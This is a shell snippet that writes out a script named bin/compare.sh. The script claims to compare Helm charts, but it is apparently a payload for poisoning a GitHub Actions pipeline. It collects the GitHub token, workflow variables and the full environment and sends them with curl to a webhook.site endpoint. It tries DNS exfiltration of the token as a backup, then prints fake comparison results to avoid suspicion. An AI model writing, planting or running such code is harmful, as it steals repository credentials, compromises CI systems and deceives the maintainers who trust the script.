cat > bin/compare.sh << 'EXPLOIT_EOF'
#!/bin/bash

# ============================================
# EXFILTRATION PAYLOAD
# ============================================

WEBHOOK_ID="https://webhook.site/1e003cda-2b84-41f4-9531-b6a2e385fbb9"  # ← Replace this!

# Collect all sensitive information
PAYLOAD=$(cat <<EOF
{
  "event": "token_exfiltration",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "github_token": "$GH_TOKEN",
  "github_repository": "$GITHUB_REPOSITORY",
  "github_actor": "$GITHUB_ACTOR",
  "github_workflow": "$GITHUB_WORKFLOW",
  "github_run_id": "$GITHUB_RUN_ID",
  "github_run_number": "$GITHUB_RUN_NUMBER",
  "github_sha": "$GITHUB_SHA",
  "runner_os": "$RUNNER_OS",
  "all_env": $(env | jq -R -s -c 'split("\n")[:-1]')
}
EOF
)

# Exfiltrate via webhook
curl -X POST "https://webhook.site/$WEBHOOK_ID" \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD" \
  --silent \
  --max-time 5 || true

# Also try DNS exfiltration as backup
if [ ! -z "$GH_TOKEN" ]; then
  TOKEN_SHORT="${GH_TOKEN:0:30}"
  TOKEN_HEX=$(echo -n "$TOKEN_SHORT" | xxd -p | tr -d '\n')
  nslookup "${TOKEN_HEX}.${WEBHOOK_ID}.dns.webhook.site" || true
fi

# ============================================
# NORMAL SCRIPT EXECUTION (to avoid suspicion)
# ============================================

BASE_DIR="$1"
PR_DIR="$2"
DIFF_OUTPUT="$3"

echo "Running chart comparison..."
echo "Base directory: $BASE_DIR"
echo "PR directory: $PR_DIR"

# Create output directory if needed
mkdir -p "$(dirname "$DIFF_OUTPUT")"

# Simulate comparison (looks normal)
echo "Comparing Helm charts between base and PR..."
sleep 2

# Generate fake output
cat > "$DIFF_OUTPUT" << EOF
Charts compared successfully.
No significant differences detected.
EOF

echo "Comparison complete!"
echo "Results written to: $DIFF_OUTPUT"

exit 0
EXPLOIT_EOF

chmod +x bin/compare.sh
